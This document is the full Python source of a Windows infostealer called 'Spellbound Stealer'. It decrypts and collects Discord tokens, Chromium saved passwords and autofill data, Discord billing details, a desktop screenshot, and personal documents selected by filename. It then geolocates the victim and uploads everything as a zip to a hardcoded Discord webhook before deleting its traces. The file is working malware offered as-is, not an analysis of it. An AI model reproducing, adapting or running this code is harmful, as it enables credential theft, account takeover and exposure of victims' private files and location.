import os
import re
import sys
import time
import json
import uuid
import ctypes
import base64
import shutil
import socket
import base64
import sqlite3
import zipfile
import platform
import subprocess

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SYSTEM =============================================================================================================== #
PYTHON_CMD = sys.executable

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

USER_PATH = f"C:\\Users\\{os.getlogin()}"

CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"
ZIP_PATH = f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()}.zip"
DISCORD_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Discord"
CHROMIUM_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Chromium Browsers"
FILES_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Files"

if not os.path.exists(CONTAINER_FOLDER_PATH):
    os.mkdir(CONTAINER_FOLDER_PATH)
if not os.path.exists(DISCORD_FOLDER_PATH):
    os.mkdir(DISCORD_FOLDER_PATH)
if not os.path.exists(CHROMIUM_FOLDER_PATH):
    os.mkdir(CHROMIUM_FOLDER_PATH)
if not os.path.exists(FILES_FOLDER_PATH):
    os.mkdir(FILES_FOLDER_PATH)

FILE_HEADER = """
┌───────────────────────────┐
│   GRABBED BY SPELLBOUND   │
└───────────────────────────┘
\n\n
"""


class log:
    def error(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
    def info(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")
    def warning(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [WARNING] {text}")

def InstallPackages(packages):
    for package in packages:
        log.info(f"Installing package {package}")
        subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

InstallPackages(packages=["requests", "pycryptodome", "pyautogui"])
import requests
import pyautogui
from Crypto.Cipher import AES

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return

    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    log.info(f"Process {processName} has been terminated")

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        pass

def ListFileInDir(directory, maxDepth=1):
    finalFiles = []
    currentDepth = 0

    if currentDepth > maxDepth:
        return finalFiles

    for root, dirs, files in os.walk(directory):
        for file in files:
            finalFiles.append(os.path.join(root, file))

        if currentDepth + 1 > maxDepth:
            dirs.clear()

    return finalFiles

def AddFolderToZip(zipFile, folderPath, arcBase=""):
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=folderPath)
            if arcBase:
                arcname = os.path.join(arcBase, arcname)
            zipFile.write(file_path, arcname)

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= DISCORD ============================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
__DISCORD_TOKENS__ = []
discordUIDS = []
discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
totalDiscordTokens = 0

def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
    
def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def ExtractInfosFromToken():
    if not __DISCORD_TOKENS__:
        return

    final_to_return = []
    for token in __DISCORD_TOKENS__:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'Username: {username} ({user_id})\n'
                         f'🔑Token: {token}\n'
                         f'Nitro: {nitro}\n'
                         f'💳Billing: {payment_methods if payment_methods != "" else "None"}\n'
                         f'🔒MFA: {mfa}'
                         f'Email: {email if email != None else "None"}\n'
                         f'📱Phone: {phone if phone != None else "None"}\n'
                         f'==============\n')
        final_to_return.append(final_message)

    return final_to_return

def GrabDiscord():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(ROAMING + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(ROAMING + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)


try:
    GrabDiscord()
    
    tokens = ExtractInfosFromToken()
    with open(f"{DISCORD_FOLDER_PATH}\\.tokens.txt", "w", encoding="utf-8") as writer:
        writer.write(FILE_HEADER)
        for token in tokens:
            writer.write(token)
            totalDiscordTokens += 1
except Exception as e:
    log.error(f"Unexpected error - Discord : {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CHROMIUM ============================================================================================================= #
__CHROMIUM_PASSWORDS__ = []
__CHROMIUM_AUTOFILLS__ = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
totalPasswords = 0
totalAutofills = 0

def DecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(pDataOut)
            ):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            log.error("Function encountered an error : {e}")
            return f"Failed to decrypt data: {e}"
        
def GrabPasswordChromium():
    for browser in chromiumBrowsers:
        KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
            ):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            log.error(f"Error decrypting master key: {e}")
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = DecryptData(encrypted_password, decryption_key)

                    if username or password:
                        __CHROMIUM_PASSWORDS__.append(
                            {
                                "browser": browser["name"],
                                "profile": subpath["name"],
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                log.error(f"Error reading passwords for {browser['name']} - {subpath['name']}: {e}")
                continue

def GrabAutofillChromium():
    for browser in chromiumBrowsers:
            KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]
                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill")
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f'Name: {autofill[0]}\n'
                                    f'Value: {autofill[1]}\n'
                                    f"Browser: {browser['name']}\n"
                                    '==============\n'
                                )
                                __CHROMIUM_AUTOFILLS__.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)

try:
    GrabPasswordChromium()

    formatted = ""
    for entry in __CHROMIUM_PASSWORDS__:
        formatted += (
            f"URL:            {entry['url']}\n"
            f"Username:       {entry['username']}\n"
            f"Password:       {entry['password']}\n"
            f"==============\n")
        totalPasswords += 1

        with open(f"{CHROMIUM_FOLDER_PATH}\\.passwords.txt", "w", encoding="utf-8") as writer:
            writer.write(FILE_HEADER)
            writer.write(formatted)
except Exception as e:
    log.error(f"Unexpected error - Chromium - Passwords : {e}")

try:
    GrabAutofillChromium()

    with open(f"{CHROMIUM_FOLDER_PATH}\\.autofills.txt", "w", encoding="utf-8") as writer:
        writer.write(FILE_HEADER)
        for autofill in __CHROMIUM_AUTOFILLS__:
            writer.write(autofill)
            totalAutofills += 1
except Exception as e:
    log.error(f"Unexpected error - Chromium - Autofills : {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FILES ================================================================================================================ #
fileStealerPaths = [f"{USER_PATH}/Desktop", f"{USER_PATH}/Documents", f"{USER_PATH}/Downloads"]
fileStealerExtensions = [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".odt", ".ods", ".bat", ".py", ".db", ".csv"]
fileStealerName = ["passeport", "certificat", "identite", "diplome", "rib", "cv", "motivation", "medical", "passe", "password", "credential", "login", "chrome", "firefox", "token", "client"]
fileMaxSize = 4194304
filesToSteal = []
totalFiles = 0

try:
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{FILES_FOLDER_PATH}\\.desktop.png")
    totalFiles += 1
except Exception as e:
    log.error(f"The screenshot encountered an error : {e}")

for path in fileStealerPaths:
    files = ListFileInDir(path)
    
    for file in files:
        if os.path.getsize(file) < fileMaxSize:
            file_name = os.path.basename(file)

            if any(file_name.endswith(ext) for ext in fileStealerExtensions) or any(name in file_name for name in fileStealerName):
                filesToSteal.append(file)

for file in filesToSteal:
    destination = f"{FILES_FOLDER_PATH}\\{os.path.basename(file)}"
    shutil.copy(file, destination)
    totalFiles += 1


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= USER PC ============================================================================================================== #
requInfos = requests.get('https://ipinfo.io')
data = requInfos.json()

session = os.getlogin()
computer_name = socket.gethostname()
osVersion = platform.system() + " " + platform.release()
architecture = platform.machine()
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= BUILD ZIP ============================================================================================================ #
with zipfile.ZipFile(ZIP_PATH, "w") as zip_file:
    AddFolderToZip(zip_file, DISCORD_FOLDER_PATH, arcBase="Discord")
    AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
    AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Files")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SEND DATA ============================================================================================================ #
embed = {
    "title": "Spellbound Stealer",
    "color": 0,
    "fields": [
        {"name": ":computer: __System Infos__", "value": f"```ansi\n[2;45m[0m[2;45m[0m[2;35mSession[0m : {session}\n[2;45m[0m[2;45m[0m[2;35mComputer Name[0m : {computer_name}\n[2;45m[0m[2;45m[0m[2;35mOS[0m : {osVersion}\n[2;45m[0m[2;45m[0m[2;35mArchitecture[0m : {architecture}\n[2;45m[0m[2;45m[0m[2;35mMAC[0m : {mac}\n[2;45m[0m[2;45m[0m[2;35mIP[0m : {ip}\n[2;45m[0m[2;45m[0m[2;35mCountry[0m : {country}\n[2;45m[0m[2;45m[0m[2;35mRegion[0m : {region}\n[2;45m[0m[2;45m[0m[2;35mCity[0m : {city}\n[2;45m[0m[2;45m[0m[2;35mLocalisation[0m : {loc}\n[2;45m[0m[2;45m[0m[2;35mInternet Provider[0m : {org}```", "inline": False},
        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n[2;34mDiscord Account[0m : {totalDiscordTokens}\n[2;34mPasswords[0m : {totalPasswords}\n[2;34mAuto-fills[0m : {totalAutofills}\n[2;34mStolen Files[0m : {totalFiles}```", "inline": False},
    ],
    "footer": {"text": "Grabbed by Spellbound"}
}
payload = {"embeds": [embed]}

url = "https://discord.com/api/webhooks/1343173600454377482/X4Lv8uWTow9D6662EeSEQoaOvVt0gUe5MLhabEYfVQHjZtoUK2amRVPfmkscL6Ym2PU5"
with open(ZIP_PATH, "rb") as zipFileToSend:
    fileReady = {"file": zipFileToSend}
    try:
        res = requests.post(url, files=fileReady, data={"payload_json": json.dumps(payload)})
    except Exception as e:
        log.error("Error with the webhook")

SafeRemove(ZIP_PATH)
shutil.rmtree(DISCORD_FOLDER_PATH)
shutil.rmtree(CHROMIUM_FOLDER_PATH)
shutil.rmtree(FILES_FOLDER_PATH)